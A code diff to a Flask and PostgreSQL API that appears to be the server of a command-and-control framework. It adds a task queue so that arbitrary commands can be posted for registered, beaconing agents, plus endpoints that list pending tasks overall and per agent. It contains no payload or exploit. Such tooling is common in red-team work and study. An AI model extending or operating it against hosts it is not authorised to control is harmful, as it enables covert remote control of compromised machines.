@@ -25,11 +25,22 @@ INSERT_BEACON = (
 )
 
 
+
+CREATE_PENDING_TASKS_TABLE = """CREATE TABLE IF NOT EXISTS pending_tasks (task_id SERIAL PRIMARY KEY, agent_id INT REFERENCES agents(id) ON DELETE CASCADE, command TEXT NOT NULL, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);"""
+
+CREATE_COMPLETED_TASKS_TABLE = """CREATE TABLE IF NOT EXISTS completed_tasks (task_id INT PRIMARY KEY REFERENCES pending_tasks(task_id), result TEXt, completion_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP);"""
+
+INSERT_TASK = """INSERT INTO pending_tasks (agent_id, command) VALUES (%s, %s) RETURNING task_id;"""
+
+
+
 LIST_AGENTS = """SELECT * FROM agents"""
 LIST_BEACONS = """SELECT * FROM beacons"""
-
+LIST_PENDING_TASKS = """SELECT * FROM pending_tasks"""
 LIST_BEACON_BY_AGENT = """SELECT agents.id, agents.ip, agents.mac, agents.installTime, beacons.time FROM agents LEFT JOIN beacons ON agents.id = beacons.agent_id WHERE agents.id = (%s);"""
+LIST_PENDING_TASKS_BY_AGENT = """SELECT * FROM pending_tasks WHERE agent_id = (%s);"""
 
+#POSTS BELOW
 
 @app.post("/api/new_agent")
 def create_agent():
@@ -64,6 +75,27 @@ def add_temp():
             cursor.execute(INSERT_BEACON, (agent_id, time))
     return {"message": "Beacon added."}, 201
 
+
+@app.post("/api/add_task")
+def add_task():
+    data = request.get_json()
+    agent_id = data["agent_id"]
+    command = data["command"]
+    with connection:
+        with connection.cursor() as cursor:
+            cursor.execute(CREATE_PENDING_TASKS_TABLE)
+            cursor.execute(INSERT_TASK, (agent_id, command))
+            task_id = cursor.fetchone()[0]
+    return {"Task ID": task_id}, 201
+
+
+
+
+
+
+#GETS BELOW
+
+
 @app.get("/api/list_agents")
 def list_agents():
     with connection:
@@ -80,10 +112,26 @@ def list_beacons():
             agents = cursor.fetchall()
     return {"beacons": agents}
 
-@app.get("/api/agent/<int:agent_id>")
+@app.get("/api/list_tasks")
+def list_tasks():
+    with connection:
+        with connection.cursor() as cursor:
+            cursor.execute(LIST_PENDING_TASKS)
+            tasks = cursor.fetchall()
+    return {"Tasks": tasks}
+
+@app.get("/api/agent/beacons/<int:agent_id>")
 def agent_beacons(agent_id):
     with connection:
         with connection.cursor() as cursor:
             cursor.execute(LIST_BEACON_BY_AGENT, (agent_id,))
             beacons = cursor.fetchall()
     return {"beacons": beacons}
+
+@app.get("/api/agent/tasks/pending/<int:agent_id>")
+def agent_pending_tasks(agent_id):
+    with connection:
+        with connection.cursor() as cursor:
+            cursor.execute(LIST_PENDING_TASKS_BY_AGENT, (agent_id,))
+            tasks = cursor.fetchall()
+    return {"Tasks": tasks}
